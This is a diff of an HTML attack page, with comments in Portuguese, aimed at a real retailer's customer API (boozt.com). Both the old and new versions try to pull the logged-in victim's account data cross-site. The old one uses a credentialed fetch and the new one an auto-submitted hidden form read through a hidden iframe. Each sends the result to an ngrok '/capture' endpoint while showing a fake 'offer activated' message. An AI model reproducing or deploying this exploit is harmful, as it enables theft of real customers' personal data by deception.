@@ -1,28 +1,32 @@
 <!DOCTYPE html>
 <html>
 <body>
+    <form id="evilForm" method="GET" action="https://www.boozt.com/de/de/api/customer" target="hiddenIframe">
+        <input type="hidden" name="X-Requested-With" value="XMLHttpRequest">
+    </form>
+    <iframe name="hiddenIframe" style="display:none;"></iframe>
     <script>
-        fetch("https://www.boozt.com/de/de/api/customer", {
-            method: "GET", // Usando GET para simplicidade; pode mudar para PATCH se necessário
-            credentials: "include", // Envia o PHPSESSID
-            headers: {
-                "X-Requested-With": "XMLHttpRequest"
+        // Envia o formulário automaticamente
+        document.getElementById("evilForm").submit();
+
+        const iframe = document.getElementsByName("hiddenIframe")[0];
+        iframe.onload = function() {
+            try {
+                // Captura o conteúdo do iframe (o JSON retornado)
+                const data = iframe.contentWindow.document.body.innerText;
+                if (data) {
+                    // Envia os dados para o ngrok
+                    const xhr = new XMLHttpRequest();
+                    xhr.open("POST", "https://327b-2804-4580-1080-7db-e5f3-62e8-de0e-c67e.ngrok-free.app/capture", true);
+                    xhr.send(data);
+                    document.body.innerHTML = "Oferta ativada! Dados enviados com sucesso.";
+                } else {
+                    document.body.innerHTML = "Erro: Nenhum dado recebido.";
+                }
+            } catch (e) {
+                document.body.innerHTML = "Erro: " + e.message;
             }
-        })
-        .then(response => response.json())
-        .then(data => {
-            // Envia os dados diretamente para o ngrok
-            fetch("https://54b7-2804-4580-1080-7db-e5f3-62e8-de0e-c67e.ngrok-free.app/capture", {
-                method: "POST",
-                body: JSON.stringify(data)
-            })
-            .then(() => {
-                document.body.innerHTML = "Oferta ativada! Dados enviados com sucesso.";
-            });
-        })
-        .catch(error => {
-            document.body.innerHTML = "Erro: " + error.message;
-        });
+        };
     </script>
 </body>
 </html>
